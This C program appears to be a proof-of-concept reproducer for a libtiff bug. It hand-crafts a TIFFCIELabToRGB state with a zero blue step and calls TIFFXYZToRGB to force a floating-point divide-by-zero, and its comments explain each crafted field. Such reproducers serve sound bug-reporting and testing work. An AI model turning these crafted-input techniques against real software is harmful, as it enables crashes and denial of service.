#include <stdint.h>
#include <stdio.h>
#include <string.h>

/* Use libtiff's internal color structs to match the library ABI/layout */
#include "libtiff/tif_color.h"

/* Prototype of the vulnerable function exported by libtiff */
extern void TIFFXYZToRGB(TIFFCIELabToRGB *cielab, float X, float Y, float Z,
                         uint32_t *r, uint32_t *g, uint32_t *b);

int main(void)
{
    TIFFCIELabToRGB state;
    memset(&state, 0, sizeof(state));

    /*
     * Craft the conversion state so that bstep == 0.0f, which causes a
     * floating-point divide-by-zero at:
     *   i = (size_t)((Yb - cielab->display.d_Y0B) / cielab->bstep);
     */

    /* Keep range small so the post-min index stays in-bounds (0). */
    state.range = 0;

    /* Identity-like matrix so Yr=X, Yg=Y, Yb=Z. */
    state.display.d_mat[0][0] = 1.0f; state.display.d_mat[0][1] = 0.0f; state.display.d_mat[0][2] = 0.0f;
    state.display.d_mat[1][0] = 0.0f; state.display.d_mat[1][1] = 1.0f; state.display.d_mat[1][2] = 0.0f;
    state.display.d_mat[2][0] = 0.0f; state.display.d_mat[2][1] = 0.0f; state.display.d_mat[2][2] = 1.0f;

    /* Clip bounds: allow positive Yb so numerator != 0, but force bstep=0. */
    state.display.d_Y0R = 0.0f;
    state.display.d_Y0G = 0.0f;
    state.display.d_Y0B = 0.0f;  /* Y0B */
    state.display.d_YCR = 100.0f;
    state.display.d_YCG = 100.0f;
    state.display.d_YCB = 100.0f; /* Keep > Yb so it won't clamp to 0 before the divide */

    /* Steps: make blue step 0 to trigger the bug; others non-zero. */
    state.rstep = 1.0f;
    state.gstep = 1.0f;
    state.bstep = 0.0f; /* divide-by-zero trigger */

    /* Output clip values */
    state.display.d_Vrwr = 255;
    state.display.d_Vrwg = 255;
    state.display.d_Vrwb = 255;

    /* Minimal LUT entries used when range==0 and index is clamped to 0. */
    state.Yr2r[0] = 0.0f;
    state.Yg2g[0] = 0.0f;
    state.Yb2b[0] = 0.0f;

    uint32_t r = 0, g = 0, b = 0;

    /* With the identity matrix, Yb = Z. Choose Z > 0 so (Yb - Y0B) > 0. */
    float X = 0.0f, Y = 0.0f, Z = 1.0f;

    /* This call will execute the faulty division by state.bstep (0.0f). */
    TIFFXYZToRGB(&state, X, Y, Z, &r, &g, &b);

    /* If it gets here without trapping, just print the values. */
    printf("r=%u g=%u b=%u\n", r, g, b);
    return 0;
}
